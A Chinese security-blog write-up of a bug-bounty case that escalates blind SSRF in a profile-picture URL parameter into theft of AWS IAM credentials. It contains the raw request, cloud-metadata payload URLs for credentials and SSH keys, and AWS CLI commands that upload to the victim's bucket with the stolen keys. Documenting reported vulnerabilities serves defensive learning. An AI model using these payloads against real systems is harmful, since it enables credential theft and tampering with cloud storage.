#  如何将低危的 SSRF 盲注升级为严重漏洞   
 Z2O安全攻防   2025-01-06 14:16  
  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;">声明：</span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></h1></td></tr></tbody></table>  
简介  
  
今天分享国外白帽Amr Mustafa如何利用 SSRF 盲注发现和利用关键漏洞的经验。  
# 什么是SSRF？  
  
   
服务器端请求伪造（SSRF）是一种允许攻击者通过服务器端应用程序发出请求到未预期位置的网络安全漏洞，攻击者可以造成服务器连接到组织内部的服务或任意外部系统，从而可能泄露敏感数据。  
# 什么是SSRF盲注？  
  
SSRF盲注是指应用程序可以被诱导向提供的URL发出后台HTTP请求，但前端响应中不返回后台请求的结果。  
  
现在我们知道了SSRF 和 SSRF 盲注之间的区别，那么让我们看看本次的实际案例吧。  
# 挖掘过程  
  
首先假设目标域名是redacted.com，注册并创建了一个新帐户，访问https://redacted.com/profile 后，有2处上传图片的选项：  
1. 从你计算机的本地上传文件  
  
1. 使用 Facebook 个人资料图片  
  
尝试第一个选项（从本地上传图片），可以看到上传的图像是可公开访问的 URL，并且在上传图片成功后，系统响应消息为“Your Account details were successfully updated（你的帐户详细信息已成功更新）”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvgpjtniaibCsUs6PicUraehZLmhSRLIw69xMGKhvSh2fcf6DcxhCOjOYvw/640?wx_fmt=png&from=appmsg "")  
  
可以看到图片存储在具有可预测 Amazon S3 存储桶中，可以不受任何访问限制地访问该图片。  
```
<img src="[redacted].s3.region.amazonaws.com/[random_hash].jpeg">
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvJkyRX0XylvdHt6IyWWaejI17ib4EgHbKDPjzXm4Wicpslur4MgCPedWQ/640?wx_fmt=png&from=appmsg "")  
  
访问该URL：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvapg0Dib3zwbib7faYlAqAMo1Qtib0QV2v0khB4Jjg5v5gEqSL9nOmlUDQ/640?wx_fmt=png&from=appmsg "")  
  
经过一番挖掘，并没能发现什么漏洞。  
  
转而选择第二个选项（使用 Facebook 个人资料图片）进行上传，前提是，必须将你的 Facebook 帐户与平台帐户连接起来。  
  
连接你的个人 Facebook 帐户后，当点击了第二个选项并拦截了请求时，白帽小哥看到了一个名为profile_picture_url的新参数：  
```
POST /profile HTTP/2
Host: account.redacted.com
Content-Type: multipart/form-data; boundary=---------------------------154478894334976744053178475009
-----------------------------154478894334976744053178475009
Content-Disposition: form-data; name="first_name"
Attacker
-----------------------------154478894334976744053178475009
Content-Disposition: form-data; name="last_name"
Attacker
-----------------------------154478894334976744053178475009
Content-Disposition: form-data; name="profile_picture_url"
https://scontent.fcai19-12.fna.fbcdn.net/v/t39.30808-1/465664427_1119561922865378_4789856880901123456_n.jpg
-----------------------------154478894334976744053178475009
```  
  
   
服务器响应：  
  
{"your account details were successfully updated"}  
  
查看源代码后，可以看到图片源更改为 s3 存储桶中的另一个哈希文件：  
  
<img src="[redacted].s3.region.amazonaws.com/[Different_Random_Hash].jpeg">  
  
该请求发送到repeater并测试“profile_picture_url”参数，首先将collaborator链接放入，查看是否存在SSRF盲注：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvMpJhXADZKEyFiaLAiaRvAr7v7hjDyBs3ZeGN9s65B3PfolbOs34YAnbQ/640?wx_fmt=png&from=appmsg "")  
  
Nice！有惊喜！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvBt0xqst089TnCllRbtI4E2nIpuPJnLoRY0eqlHlwCicib8hIXcI1kPPw/640?wx_fmt=png&from=appmsg "")  
  
可以获得 HTTP 和 DNS 交互，通过IP查询， 确认来自 Amazon AWS 主机。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvtXDU6j4rib2m3KxMAxfhWaJibt2lHCFsEmjfvzDICzy0iaDTZgcLrf03A/640?wx_fmt=png&from=appmsg "")  
  
虽然有了一个 SSRF 盲注，但我们无法执行内部端口扫描和进一步利用。我们除了收到服务器响应的“你的帐户详细信息已成功更新”外，就没有其它任何有用的信息了。  
  
然而，在测试第一个选项时 -“后端处理图像上传并将其存储在  标签内的 Amazon S3 存储桶中”，访问 https://redacted.com/profile ，查看源代码，发现它会将其保存为 HTML 文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvRr9kjaUIic5Pu6J856wdIBXJKWzB2o2VOoGHge35BzOqSH16fY4QeCA/640?wx_fmt=png&from=appmsg "")  
  
访问该 HTML的URL 后：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvVnzfasFkvIibpBlzblibz5ID9Rsnd4Zc2zkFTDcXnV35WrwcDoicnOt9Q/640?wx_fmt=png&from=appmsg "")  
  
居然是collaborator主机信息！  
  
这意味着我们可以发出内部请求并获取公开保存在公司 S3 存储桶中的数据。  
  
由于主机位于 AWS EC2 环境中，因此我们可以使用“http://169.254.169.254/latest/meta-data/iam/security-credentials/” payloads。  
  
检索 IAM 用户：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvCu93YJwcRvcoiaQWB6qmnyJ6eibSzDgEoGgc1AJicxODflEAe7dpxZwaQ/640?wx_fmt=png&from=appmsg "")  
  
访问  标记内的 URL ：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlv8cCOcuOFl7GBq4iazP5IiaOvIvm1V0oN4c69t6Ykkd0NVuS5EneES0Pg/640?wx_fmt=png&from=appmsg "")  
  
太棒了！获取用户后，我们可以注入以下payloads来窃取 IAM 用户凭证：  
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_user>”
“http://169.254.169.254/latest/meta-data/iam/security-credentials/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlv4FB9FydllTkRocnFRMxorqbQS9kaIVvZT07IcYZGyQjoub2HXre4yg/640?wx_fmt=png&from=appmsg "")  
  
图像标签内的 URL 是一个 JSON 端点，当点击之后：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvdfQSLNnpd6AVK7Mu1InVdQv3AIrucqiaCHEDjlQib6Da9QTzjH8pHsjg/640?wx_fmt=png&from=appmsg "")  
  
成功窃取用户凭证！  
  
利用以下Payloads，可以获取更多敏感信息：  
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/block-device-mapping/
http://169.254.169.254/latest/meta-data/security-groups
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/mac
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/signature
http://169.254.169.254/latest/dynamic/instance-identity/pkcs7
http://169.254.169.254/latest/dynamic/instance-identity/rsa2048
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvHT1z5Th1svfLpT726HyqIG2PLmmZK3yCDdEyYhtPnwWZ4svPODV7Ww/640?wx_fmt=png&from=appmsg "")  
  
在获取了用户凭证后，就可以尝试将其升级为 RCE（远程代码执行）或其它漏洞利用。  
  
比如，使用用户凭证访问 AWS：  
```
export AWS_ACCESS_KEY_ID= [Your_Access_Key]
export AWS_SECRET_ACCESS_KEY= [SecretKey]
export AWS_SESSION_TOKEN= [Token]
export AWS_DEFAULT_REGION= [Region]
```  
  
使用“get-caller-identity”命令返回有关其凭证用于调用操作的 IAM 用户或角色的详细信息：  
  
aws sts get-caller-identity  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlv3b4deYkXYB2S0fXBga6XLZvsK1R33JbiaAic0uvkibm4BmsvdzTZzKSZA/640?wx_fmt=png&from=appmsg "")  
  
还使用命令来获取该存储桶中上传的文件列表：  
  
aws s3 ls s3://<bucket's_name>  
  
可惜得到的是“Permission Denied”，看来 IAM 用户的权限较低，尝试使用命令上传文件：  
```
echo "POC By Drakenkun & Bedo" > POC.txt
aws s3 CP POC.txt s3://<bucket's_name>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvT9e2w8GgL8Nmb0f7KWKKrdMAPbCDzLbfBX5W0UzGTQvvOEXC9oRhrQ/640?wx_fmt=png&from=appmsg "")  
  
访问“https://[redacted].s3.region.amazonaws.com/POC.txt” :  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlv51ddEa3QibkzSyicDSib9I3cjic50lNAR1R1GPlibibg4ASaL4000olicg7yg/640?wx_fmt=png&from=appmsg "")  
  
尝试上传简单的 html 文件，用 javascript 来弹窗也是可以的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvrzS01YRkgzxxC48xRqpk7D2hSO5C1JZ1svWBxLOu4OMmDicPYr4aMyQ/640?wx_fmt=png&from=appmsg "")  
  
同时该账户还拥有“删除”权限，允许我们从 S3 存储桶中删除任何内容。  
  
白帽小哥第一时间报告了该漏洞，最终在YesWeHack平台获得了不菲的赏金奖励：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlAG4ribNHGPlxfU3orWicYlvAgSOSbY9ZwVG6OhwgpVXHPpqGnd2UN0zialSvvCWyicT5lb1W2szZD2A/640?wx_fmt=png&from=appmsg "")  
  
在整个渗透测试期间，白帽小哥还参考了一些资源：  
  
https://docs.aws.amazon.com/cli/latest/reference/s3/?source=post_page—–536505cc4352  
  
https://hackingthe.cloud/aws/general-knowledge/aws_cli_tips_and_tricks/?source=post_page—–536505cc4352  
  
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf?source=post_page—–536505cc43  
  
建立了一个  
src专项圈子，内容包含**src漏洞知识库**、**src挖掘技巧**、**src视频教程**等，一起学习赚赏金技巧，以及专属微信群一起挖洞  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、小群一起挖洞
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg41LkR0ezBlmjJY4Lwgg8mr1A5efwqe0yGE9KTQwLPJTe9zyv3wgYnhA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOXg868PqXyjsACp9LhuEeyfB2kTZVOt5Pz48txg7ueRUvDdeefTNKdg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZDDDv3NsbJDuSicLzBbwVDCPFgbmiaJ4ibf4LRgafQDdYodOgakdpbU1H6XfFQCL81VTudGBv2WniaDA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuY6DfYOuUzWiaPBBq4L5bV9ZRMpUcFktl9oiazJicibKEVwZoWo5dEaXGHIoa6yOEkfnicbMibJDALxuk1w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4Bd1oBmTkA5xlNwZM5fLghYeibMBttWrf57h8sU7xDyTe5udCNicuHo8w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrUoo5XZpxN9Inq87ic71D6aUeMdaWrKXgYYia2On8nMA7bqWDySa8odAq1a0kkp3WFgf0Zp0Eut0A/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4KKlic4yiafWTpLdejicQe3MllEQc24ypeI3anaK7IjJDVyq1WVQN2yKBA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOHgjJxnq1ibibJgVUx3LwCjZj62vygx8w6rxia1icmIWiax2YlP6S6LmlmlQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOApVm8H605qOibxia5DqPHfbWD6lmcweDjGv4DLl45waD068ugw2Iv2vg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOwldaSATYOh1WQpk1qz15rLxehOAn4aK7tdbSyNEuHDZpIISCtl6Q8w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4jFsKRMMNDKbsAZhscCiagnyJScMVmFUqMtae5omlLRdu095mywWszjQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4uGJ2SA5BhZ3UyibZvVmcP3sozQEOfVr0jftWpC3YkpDiaAicS1ib3EgXHA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
